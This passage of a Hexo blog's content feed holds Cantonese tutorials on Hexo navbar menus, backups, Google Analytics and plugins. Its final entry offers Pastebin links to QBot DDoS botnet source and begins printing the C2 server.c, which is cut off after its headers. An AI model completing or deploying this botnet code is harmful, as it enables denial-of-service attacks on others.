<h3 id="完成修改-md-檔"><a href="#完成修改-md-檔" class="headerlink" title="完成修改 md 檔"></a>完成修改 md 檔</h3><p>當你完成岩岩既步驟之後，<br>其實 Hexo 係已經認到你既位置，<br>但係仲係一個不公開既狀態，<br>因為仲未將佢擺喺睇到既位置俾人撳。</p>
<blockquote>
<p>你鐘意 : 如果你唔想俾人知道既話，係想不公開既話，去到呢度你可以停架啦。</p>
</blockquote>
<h3 id="修改-yml-檔案"><a href="#修改-yml-檔案" class="headerlink" title="修改 yml 檔案"></a>修改 yml 檔案</h3><p>黎到呢個位置因為個個 <code>themes</code> 擺既位唔一樣，但係只需要入返你既 themes 既 <code>_config.yml</code> 入去改就得了。</p>
<ul>
<li>_config.yml</li>
<li>_config.butterfly.yml</li>
</ul>
<p>當你入到去既時候，就喺個 files 搵 <code>menu:</code></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">    <span class="attr">Tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">    <span class="attr">Categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">    <span class="attr">About:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br></pre></td></tr></table></figure>

<p>見到以上既呢堆野，你就入岩位置修改架啦。</p>
<p><strong><span style="font-size:larger;">加入 <code>yoyo</code></span></strong></p>
<p>將頭先你打左既 page name 擺入去你搵到既 <code>menu:</code> 位置，改成我下面咁打既咁樣 :</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">    <span class="attr">Tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">    <span class="attr">Categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">    <span class="attr">About:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">    <span class="attr">yoyo:</span> <span class="string">/yoyo/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br></pre></td></tr></table></figure>

<h3 id="加入完成"><a href="#加入完成" class="headerlink" title="加入完成"></a>加入完成</h3><p>當你成功哂咁多步驟之後，請重新開過你既 server。</p>
<blockquote>
<p>說明一 : 因為如果你係改 <code>_config.yml</code> 檔案既話，hexo係唔識得自動更新你而加既檔案，你需要重新啟動。<br>說明二 : 除非你改既檔案係 <code>folder</code> 入面既 <code>lang</code> 咁佢就識自己 update。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo s --debug</span><br></pre></td></tr></table></figure>

<h1 id="Fontawesome"><a href="#Fontawesome" class="headerlink" title="Fontawesome"></a>Fontawesome</h1><p>喺上面你見到既 <code>fas fa-tags</code> 呢啲 code，<br>佢係根據一個 library 叫做 <code>Fontawesome</code>，<br>如果你想加入自訂既圖，你可以去呢個網度搵，</p>
<pre><code>https://fontawesome.com/search
</code></pre>
<h2 id="Fontawesome-格式"><a href="#Fontawesome-格式" class="headerlink" title="Fontawesome 格式"></a><strong><span style="font-size:larger;">Fontawesome 格式</span></strong></h2><p>請注意，如果係要加，記得要打埋 <code>||</code> 係兩者既中間，再用空白鍵隔開，即係好似以下咁樣打 :</p>
<blockquote>
<p>說明一 : 第一個 <code>yoyo</code> 係 display 既名，第二個 yoyo 係 folder 要讀取入面既 md 檔名。<br>說明二 : <code>||</code> 係必須要隔開，然後後面打你想要既 Fontawesome code。</p>
</blockquote>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">yoyo:</span> <span class="string">/yoyo/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br></pre></td></tr></table></figure>


<h1 id="子分類新增說明"><a href="#子分類新增說明" class="headerlink" title="子分類新增說明"></a>子分類新增說明</h1><p>如果你想加其他野喺 Navbar 入面，例如係 :</p>
<ul>
<li>你既分類入面既 link</li>
<li>你既tags 入面既 link</li>
</ul>
<p>咁樣仲簡單，只需要入返你既 <code>tags</code> / <code>categories</code> link，<br>再將入完既 link 擺入去頭先 <code>menu:</code> 既位置，再重開 server 就加到架啦。</p>
<blockquote>
<p>以上操作唔需要 add page。</p>
</blockquote>
<h2 id="示範新增"><a href="#示範新增" class="headerlink" title="示範新增"></a>示範新增</h2><p>以下示範係點樣加 子分類，例如你係想喺 Navbar 加你鐘意既野，我假設係 :</p>
<ul>
<li>Counter Strike 1.6</li>
<li>Counter-Strike Global Offensive</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">    <span class="attr">Games:</span></span><br><span class="line">      <span class="attr">Counter Strike 1.6:</span> <span class="string">/categories/Counter-Strike-1-6/</span></span><br><span class="line">      <span class="attr">Counter-Strike Global Offensive:</span> <span class="string">/categories/Counter-Strike-Global-Offensive/</span></span><br></pre></td></tr></table></figure>

<p>咁就打成上面既咁樣，然後出黎既結果就會係 :</p>
<blockquote>
<p>第一層 : Display 名叫 Games (撳唔會有 link 入)，<br>第二層 : 當你 hover Games 既時候，就會顯示兩個 item，分別叫做 :</p>
</blockquote>
<ul>
<li>Counter Strike 1.6</li>
<li>Counter-Strike Global Offensive</li>
</ul>
<p>然後想更新子分類見到既 display 畫面，就將 server 重開。</p>
<h1 id="43-分鐘"><a href="#43-分鐘" class="headerlink" title="43 分鐘"></a>43 分鐘</h1><p>今次呢篇用左 43 分鐘寫 …</p>
<img src="/2022/06/16/hexo-add-page-navbar-link-aref/43.png" class="">]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - 備份至新電腦繼續寫文章</title>
    <url>/2022/06/11/hexo-backup-to-new-device/</url>
    <content><![CDATA[<h1 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h1><p>備份是應該每天要做的事情，<br>如果操作失敗而檔案沒有了，<br>我本人也沒有能力為大家解決。</p>
<h1 id="Hexo-架構-butterfly"><a href="#Hexo-架構-butterfly" class="headerlink" title="Hexo 架構 (butterfly)"></a>Hexo 架構 (butterfly)</h1><blockquote>
<p>紫色筆是不用備份的資料。</p>
</blockquote>
<img src="/2022/06/11/hexo-backup-to-new-device/bk.png" class="">

<ul>
<li>.deploy_git (不用備份)<br>這個資料夾是你在 github page repo內的內容，<br>會出現是因為使用了 <code>hexo g</code> 生產，<br>並將生產內容上傳至 repo。</li>
</ul>
<ul>
<li>.github (不用備份)<br>不重要，可以無視 haha</li>
</ul>
<ul>
<li>node_modules<br>NPM 套件，這個可以在之後安裝，<br>輸入 <code>npm install</code> 安裝。<br>由於檔案大，可以刪除。</li>
</ul>
<ul>
<li>scaffolds (請備份)<br>這個是你的網站 layout 的呼叫。</li>
</ul>
<ul>
<li>source (超重要，請備份)<br>這個是你網站內所有的文章和圖片，<br>請整個備份。</li>
</ul>
<ul>
<li>themes (請備份)<br>是你所用的主題，<br>請整個備份。</li>
</ul>
<ul>
<li>.gitignore (請備份)<br>每次 push 的時候會無視哪一個檔案或者資料夾。</li>
</ul>
<ul>
<li>_config.butterfly.yml (請備份)<br>我的網站所用的主題 butterfly 的配置檔案 (yml)。</li>
</ul>
<ul>
<li>_config.yml (請備份)<br>你網站的基本配置檔案 (yml)。</li>
</ul>
<ul>
<li>db.json (不用備份)<br>不重要，這只是你每次使用 <code>hexo server</code>，<br>開啟伺服器後生產的 <code>cache</code> 檔案。<br>可以使用 <code>hexo clean</code> 清除。</li>
</ul>
<ul>
<li>package.json (重要，請備份)<br>這個是你的網站內的所有所用的 NPM 套件，<br><code>npm install</code> 會根據這個檔案去進行下載。</li>
</ul>
<ul>
<li>package-lock.json (重要，請備份)<br>這個是根據上面的 <code>package.json</code> 去進行指定版本下載，<br>如果不使用，下載來的是最新版本 (包括未隱定的版本)，<br>使用 <code>-lock</code> 就只會使用你你指定的 NPM 套件版本。</li>
</ul>
<ul>
<li>yarn.lock (重要，請備份)<br>鎖定你的 yarn 套件版本。</li>
</ul>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1 :"></a>Step 1 :</h2><blockquote>
<p>git clone 你的網站 (等同於 .deploy_git 資料夾內容)</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/username/username.github.io</span><br></pre></td></tr></table></figure>

<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2 :"></a>Step 2 :</h2><blockquote>
<p>開啟一個資料夾叫 <code>public</code>，<br>再將剛剛 clone 後的檔案放到 <code>public</code> 內</p>
</blockquote>
<img src="/2022/06/11/hexo-backup-to-new-device/public.png" class="">

<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3 :"></a>Step 3 :</h2><blockquote>
<p>除了 <code>deploy_git</code>, <code>.github</code>, <code>node_modules</code>, <code>db.json</code> 資料夾和檔案，<br>其他放到 clone 後的資料夾內。</p>
</blockquote>
<h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4 :"></a>Step 4 :</h2><blockquote>
<p>完成以上步驟後，開啟你的伺服器測試。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo server --debug</span><br></pre></td></tr></table></figure>

<h2 id="Push-to-Server"><a href="#Push-to-Server" class="headerlink" title="Push to Server"></a>Push to Server</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>

<img src="/2022/06/11/hexo-backup-to-new-device/push.png" class="">]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>網站</tag>
        <tag>Framework</tag>
        <tag>Themes</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo Butterfly - 安裝 Google Analytics</title>
    <url>/2022/06/15/hexo-butterfly-add-google-analytics/</url>
    <content><![CDATA[<img src="google.svg" width="200px"/>

<h1 id="咩係-Google-Analytics？"><a href="#咩係-Google-Analytics？" class="headerlink" title="咩係 Google Analytics？"></a>咩係 Google Analytics？</h1><p>Google Analytics（簡稱 GA），<br>一個可以追蹤網站流量俾網站 Admin<br>追蹤網站流量同埋睇下人地上呢個網睇緊乜，<br>然後 Admin 喺後台就可以睇到人地上緊你既網既邊個位，<br>簡單黎講即係 <strong>一個分析器</strong>。</p>
<h2 id="申請-Google-Analytics"><a href="#申請-Google-Analytics" class="headerlink" title="申請 Google Analytics"></a>申請 Google Analytics</h2><p>非常簡單，你只需要有一個 Google Account 就可以。<br>之後入 Google Analytics 網站 :</p>
<pre><code>https://analytics.google.com
</code></pre>
<h3 id="開始測量"><a href="#開始測量" class="headerlink" title="開始測量"></a>開始測量</h3><p>撳 <code>開始測量</code>。</p>
<img src="/2022/06/15/hexo-butterfly-add-google-analytics/1.png" class="">

<h3 id="帳戶設定"><a href="#帳戶設定" class="headerlink" title="帳戶設定"></a>帳戶設定</h3><p>輸入一個名稱，你易認就好了。<br>然後按 <code>下一個</code>。</p>
<img src="/2022/06/15/hexo-butterfly-add-google-analytics/2.png" class="">


<h3 id="資源設定"><a href="#資源設定" class="headerlink" title="資源設定"></a>資源設定</h3><p>輸入一個使用者名稱，你易認就好了。<br>然後按 <code>下一步</code>。</p>
<img src="/2022/06/15/hexo-butterfly-add-google-analytics/3.png" class="">

<h3 id="提供商家相關資訊"><a href="#提供商家相關資訊" class="headerlink" title="提供商家相關資訊"></a>提供商家相關資訊</h3><p>這邊你填好後，Google Analytics 會幫你分析你的網站會到什麼價位。<br>墳好後按 <code>建立</code>。</p>
<img src="/2022/06/15/hexo-butterfly-add-google-analytics/4.png" class="">

<h3 id="服務條款合約"><a href="#服務條款合約" class="headerlink" title="服務條款合約"></a>服務條款合約</h3><p>Tick Checkbox 後按下 <code>我接受</code>。</p>
<img src="/2022/06/15/hexo-butterfly-add-google-analytics/5.png" class="">

<h3 id="電子郵件通知"><a href="#電子郵件通知" class="headerlink" title="電子郵件通知"></a>電子郵件通知</h3><p>這邊如果不想有通知會發送給你就直接按下下面的 <code>全部取消勾選並儲存</code>。</p>
<img src="/2022/06/15/hexo-butterfly-add-google-analytics/6.png" class="">

<h3 id="設定平台"><a href="#設定平台" class="headerlink" title="設定平台"></a>設定平台</h3><p>完成上面既步驟，你已經起左一個資源，然後我地選就開始選擇平台，我地撳 <code>網站</code>。</p>
<img src="/2022/06/15/hexo-butterfly-add-google-analytics/7.png" class="">

<h3 id="設定資料串流"><a href="#設定資料串流" class="headerlink" title="設定資料串流"></a>設定資料串流</h3><p>輸入你既網站同埋串流名稱後按 <code>建立串流</code>。</p>
<img src="/2022/06/15/hexo-butterfly-add-google-analytics/8.png" class="">

<h3 id="串流詳細資料"><a href="#串流詳細資料" class="headerlink" title="串流詳細資料"></a>串流詳細資料</h3><p>成功建立串流之後，你會見到評估 ID (Tracker code)，<br>將佢 copy 低，然後我地去你既 hexo themes 修改。</p>
<img src="/2022/06/15/hexo-butterfly-add-google-analytics/9.png" class="">

<h2 id="修改-pug-檔案"><a href="#修改-pug-檔案" class="headerlink" title="修改 pug 檔案"></a>修改 pug 檔案</h2><div class="note danger flat">
    如果你本身有在 yml 檔的 <code>google_analytics</code> 嘗試加入 <code>評估ID</code>，請將他去除，以免造成錯誤。
</div>

<p>由於 Butterfly 原本自己的問題，使用原本 yml 檔內提供的 <code>google_analytics</code> 是沒有反應的，<br>我們需要修改原本的 <code>pug</code> 檔，路徑如下 :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">blog/themes/butterfly/layout/includes/head/analytics.pug</span><br></pre></td></tr></table></figure>

<h3 id="尋找修改內容"><a href="#尋找修改內容" class="headerlink" title="尋找修改內容"></a>尋找修改內容</h3><p>打開以上路徑後，尋找 <code>theme.google_analytics</code>，如下文。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> theme.google_analytics</span><br><span class="line">  script(<span class="keyword">async</span> src=<span class="string">`https://www.googletagmanager.com/gtag/js?id=<span class="subst">$&#123;theme.google_analytics&#125;</span>`</span>)</span><br><span class="line">  script.</span><br><span class="line">    <span class="built_in">window</span>.dataLayer = <span class="built_in">window</span>.dataLayer || [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gtag</span>(<span class="params"></span>)</span>&#123;dataLayer.push(<span class="built_in">arguments</span>);&#125;</span><br><span class="line">    gtag(<span class="string">&#x27;js&#x27;</span>, <span class="keyword">new</span> <span class="built_in">Date</span>());</span><br><span class="line">    gtag(<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;!&#123;theme.google_analytics&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>


<h3 id="修改內容"><a href="#修改內容" class="headerlink" title="修改內容"></a>修改內容</h3><p>將以上的內容的第二行和第七行改成這樣 :</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> theme.google_analytics                                           </span><br><span class="line">  script(<span class="keyword">async</span> src=<span class="string">`https://www.googletagmanager.com/gtag/js?id=G-123455GGCG`</span>) <span class="comment">//你的 評估 ID</span></span><br><span class="line">  script.</span><br><span class="line">    <span class="built_in">window</span>.dataLayer = <span class="built_in">window</span>.dataLayer || [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gtag</span>(<span class="params"></span>)</span>&#123;dataLayer.push(<span class="built_in">arguments</span>);&#125;</span><br><span class="line">    gtag(<span class="string">&#x27;js&#x27;</span>, <span class="keyword">new</span> <span class="built_in">Date</span>());</span><br><span class="line">    gtag(<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;G-123455GGCG&#x27;</span>); <span class="comment">//你的 評估 ID</span></span><br></pre></td></tr></table></figure>

<h2 id="等待"><a href="#等待" class="headerlink" title="等待"></a>等待</h2><p>接下來只是等待他啟動，時間會是 48 小時內。</p>
<img src="/2022/06/15/hexo-butterfly-add-google-analytics/wait.png" class="">


<h2 id="確定網站有-Google-Analytics"><a href="#確定網站有-Google-Analytics" class="headerlink" title="確定網站有 Google Analytics"></a>確定網站有 Google Analytics</h2><p>使用 ublock Origin 確定有沒有連結 :</p>
<pre><code>www.googletagmanager.com
</code></pre>
<h2 id="確定評估-ID"><a href="#確定評估-ID" class="headerlink" title="確定評估 ID"></a>確定評估 ID</h2><p>鍵盤按下 <code>F12</code> &gt; <code>Network</code> 後，<br>按下 <code>F5</code> 將頁面重新整理 &gt; <code>再查 google</code>。</p>
<p>然後如果看到你的 G-ID，就代表已經成功，如果沒有顯示，那麼你的設置絕對是搞錯了，請查看自己的檔案哪裡做錯了。</p>
<img src="/2022/06/15/hexo-butterfly-add-google-analytics/waiting.png" class="">

<h2 id="管理後台"><a href="#管理後台" class="headerlink" title="管理後台"></a>管理後台</h2><p>如果你想查看後台內容，只需於 Google Analytics 頁面 右下角按下 <i class="fa-solid fa-gear"></i> <code>管理</code></p>
<img src="/2022/06/15/hexo-butterfly-add-google-analytics/manager.png" class="">

<h3 id="管理資料串流"><a href="#管理資料串流" class="headerlink" title="管理資料串流"></a>管理資料串流</h3><p>按下 <code>資料串流</code>。</p>
<img src="/2022/06/15/hexo-butterfly-add-google-analytics/12.png" class="">

<h3 id="管理網站"><a href="#管理網站" class="headerlink" title="管理網站"></a>管理網站</h3><p>這樣就返回到這一頁了。</p>
<img src="/2022/06/15/hexo-butterfly-add-google-analytics/13.png" class="">

<h2 id="分析你的網站"><a href="#分析你的網站" class="headerlink" title="分析你的網站"></a>分析你的網站</h2><p>直接按下首頁可以看到 30 分鐘內的使用者，<br>但由於我是剛剛才加入 … ，還不夠 48 小時呢，目前還沒有人 QAQ …</p>
<img src="/2022/06/15/hexo-butterfly-add-google-analytics/14.png" class="">]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Google</tag>
        <tag>網站</tag>
        <tag>Framework</tag>
        <tag>Themes</tag>
        <tag>Hexo Butterfly</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - 相關推薦文章</title>
    <url>/2022/02/17/hexo-package-related/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>呢篇文會以 <a href="https://theme-next.js.org/">Next Theme</a> 做示範，<br>每個 Theme 做既野都大同小異，<br>所以唔洗太膽心。</p>
<h1 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-related-popular-posts --save</span><br></pre></td></tr></table></figure>

<h1 id="Uninstall"><a href="#Uninstall" class="headerlink" title="Uninstall"></a>Uninstall</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-related-popular-posts</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>網站</tag>
        <tag>Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - 安裝 Asset-Image</title>
    <url>/2022/01/06/hexo-plugins-Insert-Local-Image/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>呢篇文會以 <a href="https://theme-next.js.org/">Next Theme</a> 做示範，<br>每個 Theme 做既野都大同小異，<br>所以唔洗太膽心。</p>
<h1 id="Hexo-Insert-Local-Image"><a href="#Hexo-Insert-Local-Image" class="headerlink" title="Hexo Insert Local Image"></a>Hexo Insert Local Image</h1><p>去 <code>/_config.yml</code> 入面 搵 <code>post_asset_folder</code> 再改做 true</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>然後裝 <code>hexo-asset-image</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>

<p>裝完之後，咁你每次開新 Post <code>/source/_posts</code> Folder 除左 <code>md</code> files 仲有個同 md file 同名 用黎放圖片既 folder</p>
<h2 id="放置圖片"><a href="#放置圖片" class="headerlink" title="放置圖片"></a>放置圖片</h2><p>將張圖放入 Folder, 之後用 md格式 Import 張圖</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">![<span class="string">alt</span>](<span class="link">folder/picture.png</span>)</span><br><span class="line"></span><br><span class="line">&#123;% asset<span class="emphasis">_img [image-name] %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% asset_</span>img [image-name] [title] %&#125;</span><br><span class="line">&#123;% asset<span class="emphasis">_img image.jpg %&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
        <tag>網站</tag>
        <tag>Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - 安裝搜尋功能</title>
    <url>/2022/01/06/hexo-plugins-generator-searchdb/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>呢篇文會以 <a href="https://theme-next.js.org/">Next Theme</a> 做示範，<br>每個 Theme 做既野都大同小異，<br>所以唔洗太膽心。</p>
<h1 id="安裝搜尋功能"><a href="#安裝搜尋功能" class="headerlink" title="安裝搜尋功能"></a>安裝搜尋功能</h1><p>用 <code>npm</code> 裝</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>

<p>or</p>
<p>用 <code>yarn</code> 裝</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-generator-search</span><br></pre></td></tr></table></figure>

<p>然後去 <code>theme/next/_config.yml</code> 入面搵 <code>local_search</code>再將 <code>enable</code> 改做 <code>true</code></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Local search</span></span><br><span class="line"><span class="string">search</span></span><br><span class="line">  <span class="attr">local_search:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>完成。</p>
]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
        <tag>網站</tag>
        <tag>Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - 安裝 Deployer-git</title>
    <url>/2022/01/06/hexo-plugins-git/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>呢篇文會以 <a href="https://theme-next.js.org/">Next Theme</a> 做示範，<br>每個 Theme 做既野都大同小異，<br>所以唔洗太膽心。</p>
<h1 id="將你既Hexo-Blog-Push-到-Github-Pages"><a href="#將你既Hexo-Blog-Push-到-Github-Pages" class="headerlink" title="將你既Hexo Blog Push 到 Github Pages"></a>將你既Hexo Blog Push 到 Github Pages</h1><p>用 <code>npm</code> 裝</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>or</p>
<p>用 <code>yarn</code> 裝</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn add hexo-deployer-git</span><br></pre></td></tr></table></figure>

<p>然後去 <code>/_config.yml</code> 入面搵 <code>deploy:</code> 再改呢段野</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/&lt;yourAccount&gt;/&lt;repo&gt;</span> <span class="comment">#改返做你既Username 同 repo 名</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">&lt;your-branch&gt;</span> <span class="comment">#通常係master</span></span><br></pre></td></tr></table></figure>

<p>搞掂哂之後 打</p>
<h1 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo deploy -m &quot;commit&quot;</span><br></pre></td></tr></table></figure>

<p>咁就成功</p>
<p>PS : 如果要再push 多次就要打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean // Clean</span><br><span class="line">hexo deploy // Push</span><br></pre></td></tr></table></figure>

<p>記得係 clean完之後再 deploy</p>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
        <tag>網站</tag>
        <tag>Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - 安裝 Pjax (局部網頁更新)</title>
    <url>/2022/01/06/hexo-plugins-pjax/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>呢篇文會以 <a href="https://theme-next.js.org/">Next Theme</a> 做示範，<br>每個 Theme 做既野都大同小異，<br>所以唔洗太膽心。</p>
<h1 id="pjax-介紹"><a href="#pjax-介紹" class="headerlink" title="pjax 介紹"></a>pjax 介紹</h1><p>簡單黎講就係唔洗成個 Page Refresh 就可以 update 個網頁，改埋個 URL，<br>網站載入速度更加快，<br>就好似連登呢啲網都係有類似效果。</p>
<h1 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h1><p>入去 <code>/themes/next/_config.yml</code>，<br>將 <code>pjax: false</code> 改做 <code>true</code></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Easily enable fast Ajax navigation on your website.</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/theme-next-pjax</span></span><br><span class="line"><span class="attr">pjax:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>然後 <code>cd</code> 入去你個 blog 再打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/theme-next-pjax themes/next/source/lib/pjax</span><br></pre></td></tr></table></figure>

<p>之後重開 server，<br>你再試下 F5 Refresh 就會感覺到個網快左好多。</p>
<p>參考資料<br><a href="https://ed521.github.io/2020/05/hexo-next-upgrade/">https://ed521.github.io/2020/05/hexo-next-upgrade/</a></p>
]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
        <tag>網站</tag>
        <tag>Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>DDoS - Setup QBot Source code</title>
    <url>/2021/12/11/ddos-qbotsc/</url>
    <content><![CDATA[<h1 id="Pastebin"><a href="#Pastebin" class="headerlink" title="Pastebin"></a>Pastebin</h1><p><a href="https://pastebin.com/PDzMEHGg">[CLIENT] client.c</a><br><a href="https://pastebin.com/WppZq6MM">[SERVERSIDE] server.c</a><br><a href="https://pastebin.com/HHnL3NXZ">cc7.py</a></p>
<h1 id="server-c"><a href="#server-c" class="headerlink" title="server.c"></a>server.c</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Credits to Demented</span></span><br><span class="line"><span class="comment">//CONNECTION HANDLER MODIFIED BY Jonah</span></span><br><span class="line"><span class="comment">//edited banner and small things -Yuh</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKERZ <span class="meta-string">&quot;V1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXFDS 1000000</span></span><br><span class="line"><span class="keyword">char</span> *colorCodes[] = &#123;<span class="string">&quot;31m&quot;</span>, <span class="string">&quot;32m&quot;</span>, <span class="string">&quot;33m&quot;</span>, <span class="string">&quot;37m&quot;</span>, <span 